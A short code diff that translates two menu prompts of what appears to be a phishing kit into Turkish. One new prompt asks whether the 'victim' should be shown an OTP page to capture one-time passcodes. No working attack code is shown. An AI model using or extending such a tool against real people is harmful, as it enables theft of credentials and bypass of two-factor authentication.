@@ -1259,7 +1259,7 @@ def main_menu():
         elif mode == "test":
             choice = default_template
         else:
-            choice = input(f"{ask}Select one of the options > {green}")
+            choice = input(f"{ask} Seçeneklerden birini seçin : {green}")
         if choice != "0" and choice.startswith("0"):
             choice = choice.replace("0", "")
         if choice in choices:
@@ -1274,7 +1274,7 @@ def main_menu():
             if folder == "custom" and mask == "custom":
                 customdir = customfol()
             if otp_folder != "":
-                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
+                is_otp = input(f"\n{ask}KURBANA OTP ŞİFESİ SORULSUN MU ? Y/N {green}")
                 if is_otp == "y":
                     folder = otp_folder
             break
